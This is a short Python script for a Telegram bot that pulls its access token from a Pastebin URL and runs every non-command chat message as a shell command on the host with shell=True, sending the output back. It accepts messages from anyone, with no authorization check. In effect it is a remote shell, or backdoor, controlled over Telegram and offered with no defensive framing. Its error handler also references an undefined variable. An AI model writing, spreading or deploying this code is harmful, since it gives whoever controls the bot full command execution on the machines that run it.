import telebot
import os
import requests
import re
import subprocess

PASTE_URL = "https://pastebin.com/raw/nbEuX2hW"
__version__ = "0.0.1"

def get_token():
    try:
        response = requests.get(PASTE_URL, timeout=5)
        if response.status_code != 200:
            raise Exception("Failed to fetch token")

        token = response.text.strip()

        if not re.match(r'^\d+:[A-Za-z0-9_-]+$', token):
            raise ValueError("Invalid token format")

        return token

    except Exception as e:
        print(f"Token Error: {e}")
        exit()

bot = telebot.TeleBot(get_token())

@bot.message_handler(commands=['start'])
def start(message):
    bot.reply_to(message, "مرحبًا! أنا هنا لتنفيذ الأوامر.")

@bot.message_handler(func=lambda message: not message.text.startswith('/'))
def execute_command(message):
    command = message.text
    try:
        result = subprocess.check_output(command, shell=True, text=True)
        if not result:
            result = "تم التنفيذ بدون مخرجات."
        bot.reply_to(message, result[:4000])
    except Exception as e:
        bot.reply_to(message, f"حدث خطأ: {error}")

bot.infinity_polling()
